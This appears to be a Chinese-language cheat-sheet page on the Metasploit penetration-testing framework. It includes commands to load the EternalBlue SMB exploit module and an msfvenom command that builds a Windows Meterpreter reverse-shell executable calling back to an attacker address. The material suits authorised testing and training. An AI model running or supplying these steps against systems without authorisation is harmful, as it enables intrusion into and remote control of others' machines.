# metasploit-framework

## 简介
最强大的渗透测试框架，集成漏洞利用、后渗透、payload 生成

## 核心参数
- `msfconsole`: 启动控制台
- `search`: 搜索模块
- `use`: 使用模块
- `set`: 设置参数

## 命令示例
```bash
# 启动 msfconsole
msfconsole

# 搜索漏洞利用
msfconsole -q -x "search eternalblue"

# 使用特定模块
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; show options"

# 生成 payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
```

## 使用场景
当你找到已知漏洞时，metasploit 通常有现成的 exploit 模块

## 所属分类
- [初始访问 (Initial Access)](../categories/06-initial-access.md)
